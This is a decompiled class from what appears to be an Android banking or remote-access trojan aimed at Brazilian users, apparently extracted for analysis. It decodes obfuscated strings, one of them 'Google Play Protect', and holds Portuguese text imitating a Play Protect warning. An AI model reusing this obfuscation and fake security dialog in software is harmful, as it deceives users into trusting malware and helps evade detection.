package com.irifix;

public class h {
  public static String a() {
    String str = "";
    for (byte b = 0; b < 19; b++) {
      (new int[19])[0] = 13234;
      (new int[19])[1] = 13274;
      (new int[19])[2] = 13274;
      (new int[19])[3] = 13266;
      (new int[19])[4] = 13271;
      (new int[19])[5] = 13264;
      (new int[19])[6] = 13195;
      (new int[19])[7] = 13243;
      (new int[19])[8] = 13271;
      (new int[19])[9] = 13260;
      (new int[19])[10] = 13284;
      (new int[19])[11] = 13195;
      (new int[19])[12] = 13243;
      (new int[19])[13] = 13277;
      (new int[19])[14] = 13274;
      (new int[19])[15] = 13279;
      (new int[19])[16] = 13264;
      (new int[19])[17] = 13262;
      (new int[19])[18] = 13279;
      int i = (new int[19])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & i + 52373));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static String b() {
    String str = "";
    for (byte b = 0; b < 44; b++) {
      (new int[44])[0] = 44987;
      (new int[44])[1] = 44942;
      (new int[44])[2] = 44953;
      (new int[44])[3] = 44934;
      (new int[44])[4] = 44930;
      (new int[44])[5] = 44959;
      (new int[44])[6] = 44930;
      (new int[44])[7] = 44953;
      (new int[44])[8] = 45003;
      (new int[44])[9] = 44938;
      (new int[44])[10] = 45003;
      (new int[44])[11] = 44930;
      (new int[44])[12] = 44933;
      (new int[44])[13] = 44952;
      (new int[44])[14] = 44959;
      (new int[44])[15] = 44938;
      (new int[44])[16] = 44935;
      (new int[44])[17] = 44938;
      (new int[44])[18] = 44812;
      (new int[44])[19] = 44808;
      (new int[44])[20] = 44932;
      (new int[44])[21] = 45003;
      (new int[44])[22] = 44938;
      (new int[44])[23] = 45003;
      (new int[44])[24] = 44955;
      (new int[44])[25] = 44938;
      (new int[44])[26] = 44953;
      (new int[44])[27] = 44959;
      (new int[44])[28] = 44930;
      (new int[44])[29] = 44953;
      (new int[44])[30] = 45003;
      (new int[44])[31] = 44943;
      (new int[44])[32] = 44942;
      (new int[44])[33] = 44952;
      (new int[44])[34] = 44959;
      (new int[44])[35] = 44938;
      (new int[44])[36] = 45003;
      (new int[44])[37] = 44941;
      (new int[44])[38] = 44932;
      (new int[44])[39] = 44933;
      (new int[44])[40] = 44959;
      (new int[44])[41] = 44942;
      (new int[44])[42] = 44983;
      (new int[44])[43] = 45012;
      int i = (new int[44])[b];
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(str);
      stringBuilder.append((char)(0xFFFF & (i ^ 0xAFEB)));
      str = stringBuilder.toString();
    } 
    return str;
  }
  
  public static String c() {
    return "Instalação bloqueada pelo Play Protect";
  }
  
  public static String d() {
    return "O Play Protect não reconhece o desenvolvedor deste app. Às vezes, os apps de desenvolvedores desconhecidos podem ser perigosos.";
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/h.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */